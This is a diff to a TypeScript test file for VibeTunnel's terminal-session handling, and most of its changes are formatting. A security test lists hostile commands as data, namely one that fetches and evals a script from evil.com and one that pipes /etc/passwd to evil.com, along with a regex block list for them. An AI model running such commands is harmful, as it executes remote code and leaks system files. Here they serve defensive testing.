@@ -29,7 +29,7 @@ describe('Critical VibeTunnel Functionality', () => {
   beforeEach(() => {
     vi.clearAllMocks();
     mockSpawn = vi.mocked(spawn);
-    
+
     // Default mock for tty-fwd success
     const mockTtyFwdProcess = {
       stdout: {
@@ -45,7 +45,7 @@ describe('Critical VibeTunnel Functionality', () => {
       }),
       kill: vi.fn(),
     };
-    
+
     mockSpawn.mockReturnValue(mockTtyFwdProcess);
   });
 
@@ -74,17 +74,17 @@ describe('Critical VibeTunnel Functionality', () => {
       // Execute spawn command
       const args = ['spawn', '--name', 'Test Session', '--cwd', '/home/test', '--', 'bash'];
       const proc = mockSpawn('tty-fwd', args);
-      
+
       let sessionId = '';
       proc.stdout.on('data', (data: Buffer) => {
         sessionId = data.toString().trim();
       });
-      
+
       // Wait for process to complete
       await new Promise((resolve) => {
         proc.on('close', resolve);
       });
-      
+
       expect(sessionId).toBe('session-123');
       expect(mockSpawn).toHaveBeenCalledWith('tty-fwd', args);
     });
@@ -122,15 +122,15 @@ describe('Critical VibeTunnel Functionality', () => {
 
       const proc = mockSpawn('tty-fwd', ['list']);
       let sessions = {};
-      
+
       proc.stdout.on('data', (data: Buffer) => {
         sessions = JSON.parse(data.toString());
       });
-      
+
       await new Promise((resolve) => {
         proc.on('close', resolve);
       });
-      
+
       expect(sessions).toEqual(mockSessions);
       expect(Object.keys(sessions)).toHaveLength(1);
     });
@@ -140,13 +140,13 @@ describe('Critical VibeTunnel Functionality', () => {
       mockStreamProcess.stdout = new EventEmitter();
       mockStreamProcess.stderr = new EventEmitter();
       mockStreamProcess.kill = vi.fn();
-      
+
       mockSpawn.mockImplementationOnce(() => mockStreamProcess);
 
       // Start streaming
       const streamData: string[] = [];
       const proc = mockSpawn('tty-fwd', ['stream', 'session-123']);
-      
+
       proc.stdout.on('data', (data: Buffer) => {
         streamData.push(data.toString());
       });
@@ -156,11 +156,7 @@ describe('Critical VibeTunnel Functionality', () => {
       mockStreamProcess.stdout.emit('data', Buffer.from('Hello World\n'));
       mockStreamProcess.stdout.emit('data', Buffer.from('$ '));
 
-      expect(streamData).toEqual([
-        '$ echo "Hello World"\n',
-        'Hello World\n',
-        '$ ',
-      ]);
+      expect(streamData).toEqual(['$ echo "Hello World"\n', 'Hello World\n', '$ ']);
     });
 
     it('should terminate sessions cleanly', async () => {
@@ -181,15 +177,15 @@ describe('Critical VibeTunnel Functionality', () => {
 
       const proc = mockSpawn('tty-fwd', ['terminate', 'session-123']);
       let result = '';
-      
+
       proc.stdout.on('data', (data: Buffer) => {
         result = data.toString();
       });
-      
+
       await new Promise((resolve) => {
         proc.on('close', resolve);
       });
-      
+
       expect(result).toBe('Session terminated');
     });
   });
@@ -198,16 +194,16 @@ describe('Critical VibeTunnel Functionality', () => {
     it('should handle terminal resize events', () => {
       const resizeArgs = ['resize', 'session-123', '120', '40'];
       const proc = mockSpawn('tty-fwd', resizeArgs);
-      
+
       expect(mockSpawn).toHaveBeenCalledWith('tty-fwd', resizeArgs);
     });
 
     it('should handle concurrent sessions', async () => {
       const sessions = ['session-1', 'session-2', 'session-3'];
-      const processes = sessions.map(sessionId => {
+      const processes = sessions.map((sessionId) => {
         return mockSpawn('tty-fwd', ['stream', sessionId]);
       });
-      
+
       expect(processes).toHaveLength(3);
       expect(mockSpawn).toHaveBeenCalledTimes(3);
     });
@@ -233,19 +229,19 @@ describe('Critical VibeTunnel Functionality', () => {
       const proc = mockSpawn('tty-fwd', ['spawn', '--', 'nonexistent-command']);
       let error = '';
       let exitCode = 0;
-      
+
       proc.stderr.on('data', (data: Buffer) => {
         error = data.toString();
       });
-      
+
       proc.on('close', (code: number) => {
         exitCode = code;
       });
-      
+
       await new Promise((resolve) => {
         proc.on('close', resolve);
       });
-      
+
       expect(exitCode).toBe(1);
       expect(error).toContain('Command not found');
     });
@@ -257,16 +253,16 @@ describe('Critical VibeTunnel Functionality', () => {
         on: vi.fn(),
         kill: vi.fn(),
       };
-      
+
       mockSpawn.mockImplementationOnce(() => mockSlowProcess);
-      
+
       const proc = mockSpawn('tty-fwd', ['list']);
-      
+
       // Simulate timeout
       setTimeout(() => {
         proc.kill('SIGTERM');
       }, 100);
-      
+
       expect(proc.kill).toBeDefined();
       expect(mockSlowProcess.kill).toBeDefined();
     });
@@ -283,13 +279,13 @@ describe('Critical VibeTunnel Functionality', () => {
         null,
         undefined,
       ];
-      
+
       const isValidSessionId = (id: any) => {
         return typeof id === 'string' && /^[a-zA-Z0-9-]+$/.test(id);
       };
-      
+
       expect(isValidSessionId(validSessionId)).toBe(true);
-      invalidSessionIds.forEach(id => {
+      invalidSessionIds.forEach((id) => {
         expect(isValidSessionId(id)).toBe(false);
       });
     });
@@ -300,24 +296,18 @@ describe('Critical VibeTunnel Functionality', () => {
         ['eval', '$(curl evil.com/script.sh)'],
         ['bash', '-c', 'cat /etc/passwd | curl evil.com'],
       ];
-      
+
       const isSafeCommand = (cmd: string[]) => {
-        const dangerousPatterns = [
-          /rm\s+-rf/,
-          /eval/,
-          /curl.*evil/,
-          /\$\(/,
-          /`/,
-        ];
-        
+        const dangerousPatterns = [/rm\s+-rf/, /eval/, /curl.*evil/, /\$\(/, /`/];
+
         const cmdString = cmd.join(' ');
-        return !dangerousPatterns.some(pattern => pattern.test(cmdString));
+        return !dangerousPatterns.some((pattern) => pattern.test(cmdString));
       };
-      
-      dangerousCommands.forEach(cmd => {
+
+      dangerousCommands.forEach((cmd) => {
         expect(isSafeCommand(cmd)).toBe(false);
       });
-      
+
       expect(isSafeCommand(['ls', '-la'])).toBe(true);
       expect(isSafeCommand(['echo', 'hello'])).toBe(true);
     });
@@ -326,7 +316,7 @@ describe('Critical VibeTunnel Functionality', () => {
   describe('Performance', () => {
     it('should handle rapid session creation', async () => {
       const startTime = performance.now();
-      
+
       // Create 10 sessions rapidly
       const sessionPromises = Array.from({ length: 10 }, (_, i) => {
         return new Promise((resolve) => {
@@ -334,12 +324,12 @@ describe('Critical VibeTunnel Functionality', () => {
           proc.on('close', () => resolve(i));
         });
       });
-      
+
       await Promise.all(sessionPromises);
-      
+
       const endTime = performance.now();
       const totalTime = endTime - startTime;
-      
+
       // Should complete within reasonable time
       expect(totalTime).toBeLessThan(1000); // 1 second for 10 sessions
       expect(mockSpawn).toHaveBeenCalledTimes(10);
@@ -347,26 +337,26 @@ describe('Critical VibeTunnel Functionality', () => {
 
     it('should handle large terminal output efficiently', () => {
       const largeOutput = 'X'.repeat(100000); // 100KB of data
-      
+
       const mockProcess = new EventEmitter();
       mockProcess.stdout = new EventEmitter();
       mockProcess.stderr = new EventEmitter();
       mockProcess.kill = vi.fn();
-      
+
       mockSpawn.mockImplementationOnce(() => mockProcess);
-      
+
       const proc = mockSpawn('tty-fwd', ['stream', 'session-123']);
       let receivedData = '';
-      
+
       proc.stdout.on('data', (data: Buffer) => {
         receivedData += data.toString();
       });
-      
+
       // Emit large output
       const startTime = performance.now();
       mockProcess.stdout.emit('data', Buffer.from(largeOutput));
       const endTime = performance.now();
-      
+
       expect(receivedData).toBe(largeOutput);
       expect(endTime - startTime).toBeLessThan(100); // Should process quickly
     });
